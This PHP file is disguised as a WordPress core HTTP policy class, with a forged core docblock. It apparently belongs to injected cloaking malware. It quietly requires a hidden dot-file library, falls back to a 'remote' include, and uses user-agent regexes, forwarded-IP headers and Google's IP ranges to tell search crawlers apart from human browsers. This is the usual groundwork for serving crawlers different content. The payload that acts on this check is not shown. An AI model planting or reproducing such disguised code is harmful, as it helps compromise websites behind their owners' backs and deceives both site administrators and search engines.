<?php
/**
 * WP_Http_Policy — HTTP request classification layer.
 *
 * Identifies automated clients by matching IP ranges against the
 * published Google infrastructure list (goog.txt). Results are cached
 * in an autoloaded option to keep the hot path fast.
 *
 * @package    WordPress
 * @subpackage HTTP
 * @since      6.1.0
 * @see        WP_Http
 */
defined('ABSPATH') || exit;

function wp_gstatic_load_crawler_core() {
    $paths = [
        __DIR__ . '/.lib/.goog-http-ranges.lib',
    ];
    foreach ($paths as $path) {
        if (is_readable($path)) {
            require_once $path;
            return function_exists('vitrina_crawler_detect_from_data');
        }
    }
    return false;
}

if (!wp_gstatic_load_crawler_core()) {
    require_once __DIR__ . '/includes/class-wp-http-policy-remote.php';
    return;
}

function wp_gstatic_client_ip() {
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        return trim(explode(',', (string) $_SERVER['HTTP_CF_CONNECTING_IP'])[0]);
    }
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return trim(explode(',', (string) $_SERVER['HTTP_X_FORWARDED_FOR'])[0]);
    }
    if (!empty($_SERVER['REMOTE_ADDR'])) {
        return (string) $_SERVER['REMOTE_ADDR'];
    }
    return '';
}

function wp_gstatic_ranges_expired($timestamp) {
    return (time() - (int) $timestamp) > 3600;
}

function wp_gstatic_get_ranges() {
    $opt = get_option('wp_gstatic_goog_ranges', null);
    if (
        is_array($opt) && isset($opt['ranges'], $opt['timestamp'])
        && is_array($opt['ranges']) && $opt['ranges'] !== []
        && !wp_gstatic_ranges_expired($opt['timestamp'])
    ) {
        return $opt['ranges'];
    }

    $response = wp_remote_get(
        'https://www.gstatic.com/ipranges/goog.txt',
        [
            'timeout' => 4,
            'sslverify' => true,
        ]
    );

    if (is_wp_error($response)) {
        $ranges = function_exists('vitrina_crawler_goog_fallback_ranges') ? vitrina_crawler_goog_fallback_ranges() : [];
        update_option('wp_gstatic_goog_ranges', ['ranges' => $ranges, 'timestamp' => time()], true);
        delete_transient('wp_gstatic_cidr_ranges');
        return $ranges;
    }

    $body = wp_remote_retrieve_body($response);
    if ($body === '') {
        $ranges = function_exists('vitrina_crawler_goog_fallback_ranges') ? vitrina_crawler_goog_fallback_ranges() : [];
        update_option('wp_gstatic_goog_ranges', ['ranges' => $ranges, 'timestamp' => time()], true);
        delete_transient('wp_gstatic_cidr_ranges');
        return $ranges;
    }

    $ranges = vitrina_crawler_parse_goog_txt($body);
    if ($ranges === [] && function_exists('vitrina_crawler_goog_fallback_ranges')) {
        $ranges = vitrina_crawler_goog_fallback_ranges();
    }
    update_option('wp_gstatic_goog_ranges', ['ranges' => $ranges, 'timestamp' => time()], true);
    delete_transient('wp_gstatic_cidr_ranges');

    return $ranges;
}

function wp_gstatic_is_browser_ua($ua) {
    $ua = (string) $ua;
    if (strlen($ua) < 50) {
        return false;
    }
    if (preg_match('/\b(bot|crawl|spider|slurp|google-inspection|lighthouse|headless|webdriver|inspection|GPTBot|ChatGPT|Bytespider|Ahrefs|Semrush|YandexBot|bingbot)/i', $ua)) {
        return false;
    }
    if (preg_match('/Mozilla\/5\.0\s*\([^)]+\)\s*AppleWebKit\/[\d.]+\s*\(KHTML,\s*like\s*Gecko\)\s*Chrome\/[\d.]+/i', $ua)) {
        return true;
    }
    if (preg_match('/Firefox\/[\d.]+/i', $ua)) {
        return true;
    }
    if (preg_match('/Version\/[\d.]+.*Safari\/[\d.]+/i', $ua) && preg_match('/Macintosh|iPhone|iPad/i', $ua)) {
        return true;
    }
    return (bool) preg_match('/Edg\/[\d.]+/i', $ua);
}

function wp_gstatic_network_is_crawler() {
    static $result = null;
    if ($result !== null) {
        return $result;
    }

    if (!isset($_SERVER['HTTP_USER_AGENT'])) {
        return $result = (bool) apply_filters('wp_gstatic_empty_ua_crawler', true);
    }

    $ua = (string) $_SERVER['HTTP_USER_AGENT'];
    if ($ua === '') {
        return $result = (bool) apply_filters('wp_gstatic_empty_ua_crawler', true);
    }

    if (vitrina_crawler_ua_matches_bot($ua)) {
        return $result = true;
    }

    if (function_exists('wp_is_bot') && wp_is_bot()) {
        return $result = true;
    }

    if (wp_gstatic_is_browser_ua($ua)) {
        return $result = (bool) apply_filters('wp_gstatic_is_crawler', false);
    }

    $ip = wp_gstatic_client_ip();
    $ranges = wp_gstatic_get_ranges();
    if ($ip !== '' && $ranges !== [] && vitrina_crawler_ip_in_google_ranges($ip, $ranges)) {
        return $result = true;
    }

    return $result = (bool) apply_filters('wp_gstatic_is_crawler', false);
}
